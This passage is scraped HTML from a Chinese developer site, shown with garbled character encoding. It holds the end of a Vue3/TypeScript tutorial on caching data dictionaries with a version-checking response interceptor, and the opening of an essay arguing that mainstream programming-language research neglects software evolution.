            <span class="hljs-title function_">clearDict</span>(name)
        })
    }


    <span class="hljs-comment">/**
     * æ¸…é™¤æŒ‡å®šå­—å…¸æ•°æ®
     * <span class="hljs-doctag">@param</span> name å­—å…¸åç§°
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearDict</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">delete</span> dictData.<span class="hljs-property">value</span>[name]
    }

    <span class="hljs-comment">/**
     * æ¸…é™¤æ‰€æœ‰å­—å…¸æ•°æ®
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearAllDict</span> = (<span class="hljs-params"/>) =&gt; {
        dictData.<span class="hljs-property">value</span> = {}
    }

    <span class="hljs-keyword">return</span> {
        dictData,
        updateDictVersion,
        getDictVersion,
        getDict,
        getDicts,
        getDictLabel,
        getDictValue,
        clearDict,
        clearDicts,
        clearAllDict
    }
})
</code></pre>
<h3 data-id="heading-21">useDict å®ç°</h3>
<p>ä¸ºç»„ä»¶æä¾›<strong>å­—å…¸æ•°æ®çš„ç»Ÿä¸€è®¿é—®å…¥å£</strong>ï¼Œå°è£…äº†å­—å…¸æ•°æ®çš„åˆå§‹åŒ–åŠ è½½ã€è¯¦æƒ…æŸ¥è¯¢ã€æ ‡ç­¾/å€¼è½¬æ¢ç­‰é«˜é¢‘æ“ä½œï¼Œç®€åŒ–ç»„ä»¶å±‚å¯¹å­—å…¸æ•°æ®çš„è°ƒç”¨é€»è¾‘ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-keyword">type</span> <span class="hljs-title class_">Details</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/system/dict'</span>
<span class="hljs-keyword">import</span> { useDictStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store/dict'</span>

<span class="hljs-comment">// æ ¹æ®å­—å…¸å€¼çš„nameè·å–å­—å…¸è¯¦æƒ…</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useDict</span> = (<span class="hljs-params">params: <span class="hljs-built_in">string</span>[] = []</span>) =&gt; {

  <span class="hljs-keyword">const</span> dict = ref&lt;<span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Details</span>[]&gt;&gt;()
  <span class="hljs-keyword">const</span> dictStore = <span class="hljs-title function_">useDictStore</span>()

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDicts</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    dict.<span class="hljs-property">value</span> = <span class="hljs-keyword">await</span> dictStore.<span class="hljs-title function_">getDicts</span>(params)
  }

  <span class="hljs-comment">// åˆå§‹åŒ–å­—å…¸æ•°æ®</span>
  <span class="hljs-title function_">getDicts</span>()

  <span class="hljs-comment">// æ ¹æ®å­—å…¸åç§°è·å–å­—å…¸æ•°æ®</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDict</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-keyword">return</span> dictStore.<span class="hljs-title function_">getDict</span>(name)
  }

  <span class="hljs-comment">// æ ¹æ®å­—å…¸å€¼è·å–å­—å…¸label</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictLabel</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-keyword">return</span> dictStore.<span class="hljs-title function_">getDictLabel</span>(name, value)
  }

  <span class="hljs-keyword">return</span> {
    dict,
    getDict,
    getDictLabel
  }
}
</code></pre>
<h3 data-id="heading-22">å“åº”æ‹¦æˆª</h3>
<p>ä¸»è¦ç”¨äºè·å–å­—å…¸çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œé€šè¿‡å¯¹æ¯”ç‰ˆæœ¬ä¿¡æ¯ï¼Œä»è€Œç¡®å®šæ˜¯å¦æ¸…é™¤æœ¬åœ°çš„å­—å…¸ç¼“å­˜æ•°æ®ï¼Œå¹¶æ›´æ–°æœ¬åœ°ç¼“å­˜çš„ç‰ˆæœ¬ä¿¡æ¯</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å“åº”æ‹¦æˆªå™¨</span>
service.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-comment">// AxiosResponse</span>
  <span class="hljs-function">(<span class="hljs-params">response: AxiosResponse</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> dictVersion = response.<span class="hljs-property">headers</span>[<span class="hljs-string">'x-dictionary-version'</span>]
    <span class="hljs-keyword">if</span> (dictVersion) {
      <span class="hljs-keyword">const</span> dictStore = <span class="hljs-title function_">useDictStore</span>()
      <span class="hljs-comment">// å¯¹æ¯”ç‰ˆæœ¬æ˜¯å¦æœ‰æ›´æ–°</span>
      <span class="hljs-keyword">if</span> (dictStore.<span class="hljs-title function_">getDictVersion</span>() !== dictVersion) {
        dictStore.<span class="hljs-title function_">clearAllDict</span>()
        dictStore.<span class="hljs-title function_">updateDictVersion</span>(dictVersion || <span class="hljs-string">''</span>)
      }
    }
    <span class="hljs-comment">// ...é¡¹ç›®ä¸­çš„ä¸šåŠ¡é€»è¾‘</span>
  }
)
</code></pre>
<h3 data-id="heading-23">é¡¹ç›®ä¸­çš„å…·ä½“ä½¿ç”¨</h3>
<p>ä¸‹è¿°çš„æ€ä¹ˆä½¿ç”¨å°è£…çš„å­—å…¸ç®¡ç†çš„ç®€å•demo</p>
<pre><code class="hljs language-ts" lang="ts">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { useDict } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/hooks/useDict'</span>
<span class="hljs-comment">// è·å–dict</span>
<span class="hljs-keyword">const</span> { dict, getDictLabel } =  <span class="hljs-title function_">useDict</span>([<span class="hljs-string">'status'</span>, <span class="hljs-string">'sex'</span>])
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dict.<span class="hljs-property">status</span>, dict.<span class="hljs-property">sex</span>)
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-24">é¡¹ç›®æºç åœ°å€</h3>
<p>neståç«¯</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FYangGong-Zi%2FUnusual-Server" target="_blank" title="https://github.com/YangGong-Zi/Unusual-Server" ref="nofollow noopener noreferrer">Unusual-Server (github)</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2FYancy_Hill%2Funusual-server" target="_blank" title="https://gitee.com/Yancy_Hill/unusual-server" ref="nofollow noopener noreferrer">Unusual-Server (gitee)</a></p>
<p>vue3å‰ç«¯</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwzwdream%2FUnusual-Admin" target="_blank" title="https://github.com/wzwdream/Unusual-Admin" ref="nofollow noopener noreferrer">Unusual-Admin (github)</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fwang-zewei-dream%2FUnusual-Admin" target="_blank" title="https://gitee.com/wang-zewei-dream/Unusual-Admin" ref="nofollow noopener noreferrer">Unusual-Admin (gitee)</a></p>
<h2 data-id="heading-25">ç»“è¯­</h2>
<p>æœ¬æ–‡ä»‹ç»äº†å››ç§ä¸»æµçš„æ•°æ®å­—å…¸å®ç°æ–¹æ¡ˆï¼Œä»å…¨é‡åŠ è½½åˆ°æŒ‰éœ€åŠ è½½ï¼Œä»æ— ç¼“å­˜åˆ°ç‰ˆæœ¬æ ¡éªŒç¼“å­˜ï¼Œæ¯ç§æ–¹æ¡ˆéƒ½å±•ç°äº†å…¶ç‹¬ç‰¹çš„ä¼˜åŠ¿ä¸ç¼ºç‚¹ã€‚é€šè¿‡å¯¹æ¯”åˆ†æï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ï¼Œæ²¡æœ‰ä¸€ç§æ–¹æ¡ˆèƒ½å¤Ÿé€‚ç”¨äºæ‰€æœ‰åœºæ™¯ï¼Œè€Œæ˜¯éœ€è¦æ ¹æ®é¡¹ç›®çš„å…·ä½“ç‰¹æ€§è¿›è¡Œçµæ´»é€‰æ‹©ã€‚å¯¹äºå­—å…¸ç¨³å®šä¸”é‡å°çš„é¡¹ç›®ï¼Œå…¨é‡ç¼“å­˜æ–¹æ¡ˆèƒ½å¤Ÿå¸¦æ¥æè‡´çš„å“åº”é€Ÿåº¦ï¼›å¯¹äºå­—å…¸é¢‘ç¹æ›´æ–°çš„åœºæ™¯ï¼Œç‰ˆæœ¬æ ¡éªŒç¼“å­˜æ–¹æ¡ˆåˆ™èƒ½åœ¨ä¿éšœæ•°æ®å®æ—¶æ€§çš„åŒæ—¶ï¼Œå®ç°å­˜å‚¨ç©ºé—´ä¸ç½‘ç»œè¯·æ±‚çš„å¹³è¡¡ä¼˜åŒ–ã€‚æœªæ¥ï¼Œéšç€æŠ€æœ¯çš„ä¸æ–­è¿›æ­¥ä¸åº”ç”¨åœºæ™¯çš„ä¸æ–­æ‹“å±•ï¼Œæ•°æ®å­—å…¸çš„å®ç°æ–¹æ¡ˆä¹Ÿå°†æŒç»­æ¼”è¿›ã€‚</p>
<blockquote>
<p>åšå®¢ä¸»è¦è®°å½•ä¸€äº›å­¦ä¹ çš„æ–‡ç« ï¼Œå¦‚æœ‰ä¸è¶³ï¼Œæœ›å¤§å®¶æŒ‡å‡ºï¼Œè°¢è°¢ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç›®å‰ä¸»æµçš„ç¨‹åºè¯­è¨€ä¸è½¯ä»¶å·¥ç¨‹ç ”ç©¶ä¸­çœŸæ­£ä¸¥é‡çš„ç¼ºé™·æ˜¯ä»€ä¹ˆï¼Ÿ]]></title>    <link>https://juejin.cn/post/7581750253000572963</link>    <guid>https://juejin.cn/post/7581750253000572963</guid>    <pubDate>2025-12-10T02:35:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581750253000572963" data-draft-id="7581870491756740643" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç›®å‰ä¸»æµçš„ç¨‹åºè¯­è¨€ä¸è½¯ä»¶å·¥ç¨‹ç ”ç©¶ä¸­çœŸæ­£ä¸¥é‡çš„ç¼ºé™·æ˜¯ä»€ä¹ˆï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯,æ¶æ„,æ•°å­¦"/> <meta itemprop="datePublished" content="2025-12-10T02:35:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="canonical_entropy"/> <meta itemprop="url" content="https://juejin.cn/user/4212984289694429"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç›®å‰ä¸»æµçš„ç¨‹åºè¯­è¨€ä¸è½¯ä»¶å·¥ç¨‹ç ”ç©¶ä¸­çœŸæ­£ä¸¥é‡çš„ç¼ºé™·æ˜¯ä»€ä¹ˆï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984289694429/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    canonical_entropy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:35:34.000Z" title="Wed Dec 10 2025 02:35:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»27åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¦‚æœåªä»â€œæŸç§è¯­è¨€ä¸å¤Ÿä¼˜é›…â€â€œæŸç§æ–¹æ³•è½åœ°éš¾â€æ¥è°ˆç¼ºé™·ï¼Œå¾ˆå®¹æ˜“åœç•™åœ¨æˆ˜æœ¯å±‚é¢ã€‚è¦è°ˆâ€œçœŸæ­£ä¸¥é‡çš„ç¼ºé™·â€ï¼Œå¿…é¡»ä¸‹æ½œåˆ°æ›´åº•å±‚çš„é—®é¢˜ï¼š</p>
<blockquote>
<p>ç›®å‰ä¸»æµçš„ç¨‹åºè¯­è¨€ä¸è½¯ä»¶å·¥ç¨‹ç†è®ºï¼Œæ˜¯ç”¨ä¸€ç§ä»€ä¹ˆæ ·çš„ä¸–ç•Œè§‚åœ¨çœ‹è½¯ä»¶ï¼Ÿ<br/>
è€Œè¿™ä¸ªä¸–ç•Œè§‚ï¼Œæœ¬èº«é—æ¼äº†ä»€ä¹ˆï¼Ÿ</p>
</blockquote>
<p>æˆ‘ä¼šä»ä¸‰å±‚æ¥å±•å¼€ï¼š</p>
<ol>
<li>å­¦ç•Œä¸»æµèŒƒå¼åˆ°åº•åœ¨å‡å®šä¸€ä¸ªä»€ä¹ˆæ ·çš„ä¸–ç•Œï¼Ÿè¿™ä¸ªä¸–ç•Œè§‚çš„è¾¹ç•Œåœ¨å“ªé‡Œï¼Ÿ</li>
<li>çœŸæ­£çš„éš¾é¢˜â€”â€”é•¿æœŸæ¼”åŒ–ä¸å¯å˜æ€§ç®¡ç†â€”â€”å¦‚ä½•è¢«ç³»ç»Ÿæ€§å¼±åŒ–ç”šè‡³â€œç†è®ºå¤–åŒ…â€ç»™å·¥ç¨‹å®è·µï¼Ÿ</li>
<li>å¦‚æœæ‰¿è®¤è¿™ç§ç¼ºå£ï¼Œå¯èƒ½çš„æ›¿ä»£/è¡¥å…¨æ–¹å‘æ˜¯ä»€ä¹ˆï¼Ÿâ€œç»“æ„ç©ºé—´ + å·®é‡ï¼ˆÎ”ï¼‰+ åˆå¹¶ï¼ˆâŠ•ï¼‰â€è¿™æ ·çš„è§†è§’èƒ½è¡¥ä¸Šä»€ä¹ˆï¼Ÿå®ƒå¦‚ä½•æŠŠ MDAã€SPLã€DSLã€DDD ç­‰æ‹‰å›ä¸€ä¸ªç»Ÿä¸€æ¡†æ¶ï¼Ÿ</li>
</ol>
<p>æœ¬æ–‡çš„æ ¸å¿ƒä¸»å¼ ï¼Œåœ¨å¼•å…¥â€œå¹¿ä¹‰å¯é€†è®¡ç®—ï¼ˆGRCï¼‰â€ä¹‹åï¼Œå¯ä»¥è¡¨è¿°ä¸ºï¼š</p>
<blockquote>
<p>ç°æœ‰ PL/SE ç†è®ºï¼ŒæŠŠâ€œå•ä¸ªç¨‹åº + é™æ€æ­£ç¡®æ€§ + ä¸€æ¬¡æ€§ç”Ÿæˆâ€å½“æˆä¸­å¿ƒï¼Œ<br/>
å´ç¼ºä¹ä¸€å¥—<strong>ä»¥å·®é‡ï¼ˆÎ”ï¼‰ã€åˆå¹¶ï¼ˆâŠ•ï¼‰å’Œç¨‹åºæ—æ¼”åŒ–</strong>ä¸ºæ ¸å¿ƒçš„ä¸€èˆ¬ç†è®ºã€‚</p>
<p>GRC æå‡ºï¼š<br/>
<strong>App = Generator âŠ• Î”</strong>ï¼Œ<br/>
å³ <strong>Y = F(X) âŠ• Î”</strong>ï¼Œ<br/>
æŠŠâ€œç”Ÿæˆâ€å’Œâ€œæ¼”åŒ–â€ç»Ÿä¸€åœ¨ä¸€æ¡æ–¹ç¨‹é‡Œï¼ŒæŠŠâ€œå˜åŒ–â€æœ¬èº«æå‡ä¸ºä¸€ç­‰å…¬æ°‘ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä¸»æµèŒƒå¼çš„ä¸–ç•Œè§‚ï¼Œä»¥åŠå®ƒé®è”½äº†ä»€ä¹ˆ</h2>
<h3 data-id="heading-1">1.1 ç±»å‹ä¸å‡½æ•°å¼ï¼šç¦»æ•£åˆ†ç±»å’Œé™æ€æ­£ç¡®æ€§çš„èƒœåˆ©</h3>
<p>ç°ä»£ç¼–ç¨‹è¯­è¨€ç†è®ºæœ€è€€çœ¼çš„æˆæœé›†ä¸­åœ¨ï¼š</p>
<ul>
<li>ç±»å‹ç³»ç»Ÿï¼šHindleyâ€“Milnerã€å¤šæ€ã€System Fã€ä¾èµ–ç±»å‹ã€çº¿æ€§ç±»å‹ã€effect system ç­‰ï¼›</li>
<li>å‡½æ•°å¼è¯­ä¹‰ï¼šlambda æ¼”ç®—ã€denotational semanticsã€logical relationsï¼›</li>
<li>è¯æ˜åŠ©æ‰‹ï¼šCoqã€Agdaã€Leanï¼ŒæŠŠâ€œç¨‹åº = è¯æ˜â€çš„æƒ³æ³•æ¨å‘å·¥ä¸šç•Œã€‚</li>
</ul>
<p>å®ƒä»¬è§£å†³çš„æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„é—®é¢˜ï¼š</p>
<blockquote>
<p>å¦‚ä½•åœ¨å±€éƒ¨ã€åœ¨å•ä¸ªç¨‹åºæˆ–æ¨¡å—ä¸Šï¼Œä¿è¯é™æ€å®‰å…¨ã€è¯­ä¹‰æ¸…æ™°ã€è¡Œä¸ºå¯é¢„æµ‹ã€‚</p>
</blockquote>
<p>ä½†å®ƒä»¬éšå«äº†ä¸€ç»„å‡ ä¹ä¸è¢«è¯´ç ´çš„å‰æï¼š</p>
<ol>
<li>
<p><strong>ä¸–ç•Œå¯ä»¥ç”¨æœ‰é™/å¯æ•°çš„â€œç±»å‹â€åˆ†ç±»</strong></p>
<ul>
<li>å…ˆè®¤ä¸ºå€¼å¯ä»¥å½’ç±»åˆ°è‹¥å¹² typeï¼›</li>
<li>å†ç ”ç©¶ type ä¹‹é—´çš„å…³ç³»ï¼ˆå­ç±»å‹ã€å¤šæ€ã€effect æ ‡è®°ç­‰ï¼‰ï¼›</li>
<li>ç ”ç©¶é‡ç‚¹æ˜¯â€œå“ªäº›è¡¨è¾¾å¼æ˜¯åˆæ³•çš„â€ã€â€œå¦‚ä½•é™åˆ¶éæ³•è¡Œä¸ºâ€ã€‚</li>
</ul>
</li>
<li>
<p><strong>å…³æ³¨ç‚¹æ”¾åœ¨â€œä¸€ä¸ªé™æ€ç¨‹åºâ€çš„æ€§è´¨ä¸Š</strong></p>
<ul>
<li>ä¸€ä»½æºç ã€ä¸€ä¸ª ASTï¼Œä¸€ä¸ªç¼–è¯‘ artifactï¼›</li>
<li>ç±»å‹ç³»ç»Ÿç¡®ä¿è¿™ä¸€æ¬¡æ„é€ çš„ artifact æœ‰å¥½æ€§è´¨ï¼›</li>
<li>â€œå¤šç‰ˆæœ¬æ¼”è¿›â€â€œå˜ä½“æ—â€â€œé•¿æœŸæ¼”åŒ–è½¨è¿¹â€ä¸æ˜¯ä¸»è§’ã€‚</li>
</ul>
</li>
<li>
<p><strong>é»˜è®¤æ˜¯å°é—­ä¸–ç•Œ</strong></p>
<ul>
<li>è§„æ ¼æ˜¯ç»™å®šçš„ï¼›</li>
<li>ç¯å¢ƒç›¸å¯¹ç¨³å®šï¼›</li>
<li>ä¸æŠŠâ€œè§„æ ¼è‡ªèº«å¦‚ä½•å˜åŒ–â€å½“ä½œä¸€ç­‰å¯¹è±¡ã€‚</li>
</ul>
</li>
</ol>
<p>æ‰€ä»¥ï¼Œä»Šå¤©çš„ PL/ç±»å‹ç†è®ºçš„ä¸»çº¿é—®é¢˜å¯ä»¥æ¦‚æ‹¬ä¸ºï¼š</p>
<blockquote>
<p>â€œå¦‚ä½•æ›´å¥½åœ°æè¿°å’ŒéªŒè¯ä¸€ä¸ª<strong>ç»™å®šç¨‹åº</strong>çš„æ€§è´¨ï¼Ÿâ€</p>
</blockquote>
<p>è€Œä¸æ˜¯ï¼š</p>
<blockquote>
<p>â€œè¿™é—¨è¯­è¨€æ‰€èƒ½ç”Ÿæˆçš„<strong>æ‰€æœ‰ç¨‹åº + å®ƒä»¬æ‰€æœ‰æ¼”åŒ–è·¯å¾„</strong>æ„æˆä»€ä¹ˆæ ·çš„ç»“æ„ç©ºé—´ï¼Ÿâ€</p>
</blockquote>
<p>æŠŠâ€œå•ä¸ªç¨‹åºâ€çš„é™æ€æ­£ç¡®æ€§å½“æˆä¸­å¿ƒï¼ŒæŠŠâ€œç¨‹åºæ—åŠå…¶æ¼”åŒ–ç»“æ„â€å½“æˆå¤–å›´å·¥ç¨‹é—®é¢˜ï¼Œè¿™æ˜¯ç¬¬ä¸€ä¸ªç»“æ„æ€§ç¼ºå£ã€‚</p>
<p>æ›´æ·±ä¸€å±‚æ˜¯ï¼šè¿™ç§ä»¥â€œç±»å‹ + å‡½æ•°â€ä¸ºä¸­å¿ƒçš„è§†è§’ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ç§â€œç­‰ä»·ç±» + å˜æ¢â€çš„ä¸–ç•Œè§‚ï¼Œå¤©ç„¶ä¸æ“…é•¿è¡¨è¾¾â€œç©ºé—´åæ ‡ä¸Šçš„åœºâ€å’Œâ€œåœ¨æ¯ä¸ªåæ ‡ç‚¹ä¸Šé™„ç€çš„å·®é‡â€ã€‚ç±»å‹å…³æ³¨çš„æ˜¯â€œè¿™ä¸€æ’®å€¼å±äºåŒä¸€ç±»â€ï¼Œè€Œä¸æ˜¯â€œè¿™ä¸ªå€¼åœ¨ç»“æ„ç©ºé—´é‡Œçš„ä½ç½®â€ã€‚</p>
<h3 data-id="heading-2">1.2 å½¢å¼æ–¹æ³•ï¼šå¤šæ˜¯â€œå¿«ç…§çº§â€çš„ï¼Œè€Œä¸æ˜¯â€œè½¨è¿¹çº§â€çš„</h3>
<p>Hoare é€»è¾‘ã€æ¨¡å‹æ£€æµ‹ã€æŠ½è±¡è§£é‡Šã€åˆçº¦å¼è®¾è®¡ï¼Œåœ¨å®‰å…¨åè®®ã€ç¼–è¯‘å™¨ã€å…³é”®ç³»ç»Ÿç­‰é¢†åŸŸéå¸¸æˆåŠŸã€‚å…¸å‹æµç¨‹æ˜¯ï¼š</p>
<ol>
<li>ç»™å‡ºä¸€ä¸ªè§„æ ¼ Specï¼›</li>
<li>ç»™å‡ºä¸€ä¸ªå®ç° Pï¼›</li>
<li>åœ¨æŸä¸ªé€»è¾‘/æ¨¡å‹ä¸‹è¯æ˜ï¼šP âŠ¨ Specã€‚</li>
</ol>
<p>è€ŒçœŸå®çš„è½¯ä»¶å·¥ç¨‹é•¿æœŸæ¼”åŒ–é—®é¢˜æ›´åƒï¼š</p>
<ul>
<li>Spec åœ¨å˜ï¼ˆéœ€æ±‚å˜åŒ–ã€ä¸å®Œæ•´ã€ä¸€å¼€å§‹å°±ä¸å®Œå¤‡ï¼‰ï¼›</li>
<li>P ä¸æ–­æœ‰ patchã€refactoringã€å˜ä½“å®šåˆ¶ï¼›</li>
<li>åŒä¸€â€œäº§å“çº¿â€åœ¨ä¸åŒå®¢æˆ·ã€ä¸åŒç‰ˆæœ¬ä¸Šå½¢æˆä¸€ä¸ªæ—ã€‚</li>
</ul>
<p>ç›®å‰å½¢å¼æ–¹æ³•é‡Œå…³äºæ¼”åŒ–çš„å·¥ä½œæ˜¯æœ‰çš„ï¼ˆincremental verificationã€regression verificationã€delta-oriented modeling ç­‰ï¼‰ï¼Œä½†æ€»ä½“ä¸Šï¼š</p>
<blockquote>
<p>è§„æ ¼/å®ç°/è¯æ˜ï¼Œä»ç„¶è¢«çœ‹ä½œä¸€ç³»åˆ—ç¦»æ•£å¿«ç…§ä¹‹é—´çš„ç‹¬ç«‹é—®é¢˜ï¼Œ<br/>
è€Œä¸æ˜¯ä¸€ä¸ªåœ¨â€œæ¼”åŒ–ç©ºé—´â€ä¸ŠæŒç»­è¿è¡Œçš„è½¨è¿¹é—®é¢˜ã€‚</p>
</blockquote>
<p>æ¢å¥è¯è¯´ï¼š</p>
<ul>
<li>â€œæŸä¸ªå›ºå®šç‰ˆæœ¬ P æ˜¯å¦æ»¡è¶³ Specâ€æœ‰å¾ˆå¤šç†è®ºï¼›</li>
